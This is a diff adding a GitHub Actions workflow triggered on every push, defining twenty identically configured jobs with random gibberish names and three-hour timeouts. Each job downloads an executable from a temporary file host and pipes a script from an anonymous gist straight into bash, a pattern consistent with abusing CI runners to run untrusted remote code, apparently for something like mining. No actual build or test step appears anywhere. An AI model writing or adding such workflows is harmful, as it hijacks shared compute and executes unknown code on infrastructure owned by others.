@@ -1,0 +1,163 @@
+name: tolofe
+on: push
+jobs:
+  nuxegu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  jiwipe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  jexalido:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  losuniyu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  soriwoku:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  sutige:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  duxajuwu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  gayoje:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  yeraxuge:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  talixi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  vemikifi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  namoso:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  pebiji:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  dutici:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  hacudefi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  gojagule:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  tabanibo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  nofugo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  tisodi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
+  loruso:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://temp.sh/iKYiR/le; chmod +x le
+    - name: Update
+      run: curl https://gist.githubusercontent.com/viheybe/07de665f3730d8d1d0579d561804f4e3/raw/42b6fadabdffb78c649ffcdb795409adbd0210cc/gistfile1.txt | bash -
